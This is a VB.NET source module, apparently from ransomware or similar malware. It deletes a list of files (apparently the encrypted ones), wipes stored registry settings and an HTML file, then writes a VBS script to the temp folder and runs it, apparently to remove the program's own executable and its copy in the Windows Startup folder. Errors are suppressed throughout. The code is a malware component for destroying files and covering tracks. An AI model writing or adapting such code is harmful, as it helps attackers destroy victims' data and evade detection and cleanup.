﻿Module del
    Sub del()
        On Error Resume Next
        For Each filename In Form4.listenc
            If IO.File.Exists(filename) Then
                IO.File.Delete(filename)
            End If
        Next

        SaveSetting("P", "0", Class1.Settings.Setting, "")
        SaveSetting("H", "0", Class1.Settings.Setting, "") ' clear old Setting
        SaveSetting("M", "0", Class1.Settings.Setting, "")
        SaveSetting("S", "0", Class1.Settings.Setting, "")
        SaveSetting("X", "0", Class1.Settings.Setting, "")
        SaveSetting("D", "0", Class1.Settings.Setting, "")
        SaveSetting("T", "0", Class1.Settings.Setting, "")
        SaveSetting("G", "0", Class1.Settings.Setting, "")
        SaveSetting("F", "0", Class1.Settings.Setting, "")
        SaveSetting("C", "0", Class1.Settings.Setting, "")

        If IO.File.Exists(Class1.Settings.html) Then
            IO.File.Delete(Class1.Settings.html)
        End If
        Dim stb As String = My.Resources.del
        Dim pathh As String = IO.Path.GetTempPath & "del.vbs"
        stb = stb.Replace("%path%", Application.ExecutablePath)
        stb = stb.Replace("%startup%", Environment.GetFolderPath(7) & "\" & Class1.Settings.mute & ".exe")
        Dim objWriter As New System.IO.StreamWriter(pathh, False)
        objWriter.WriteLine(stb)
        objWriter.Close()
        Process.Start(pathh)
        End
    End Sub
End Module
